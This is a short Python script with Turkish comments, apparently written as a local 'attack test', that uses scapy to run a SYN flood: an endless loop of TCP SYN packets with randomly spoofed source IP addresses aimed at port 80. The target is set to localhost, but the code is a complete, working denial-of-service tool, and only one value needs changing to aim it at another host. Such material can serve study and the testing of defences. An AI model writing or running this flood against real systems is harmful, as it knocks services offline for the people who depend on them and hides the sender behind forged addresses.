# saldiri_test.py
from scapy.all import IP, TCP, send, RandIP
import time

# Saldırıyı kendi bilgisayarımıza (localhost) yönlendiriyoruz.
target_ip = "127.0.0.1"
# Yaygın bir port olan HTTP portunu (80) hedef alıyoruz.
target_port = 80

print(f"Hedef: {target_ip}:{target_port}")
print("SYN Flood saldırı simülasyonu başlatılıyor...")
print("Durdurmak için Ctrl+C'ye basın.")

try:
    # Sonsuz bir döngüde rastgele kaynak IP'lerden SYN paketleri gönder
    while True:
        # Saldırıyı daha gerçekçi göstermek için kaynak IP adresini rastgele seç
        kaynak_ip = str(RandIP())
        
        # IP ve TCP katmanlarını içeren, sadece SYN bayrağı aktif olan bir paket oluştur
        paket = IP(src=kaynak_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
        
        # Paketi gönder ve scapy'nin varsayılan çıktılarını engelle
        send(paket, verbose=0)

except KeyboardInterrupt:
    print("\nSaldırı simülasyonu başarıyla durduruldu.")
except Exception as e:
    print(f"\n❌ HATA: Script çalıştırılırken bir sorun oluştu: {e}")
    print("💡 İpucu: Bu script'i Yönetici (Administrator/root) olarak çalıştırdığınızdan emin olun.")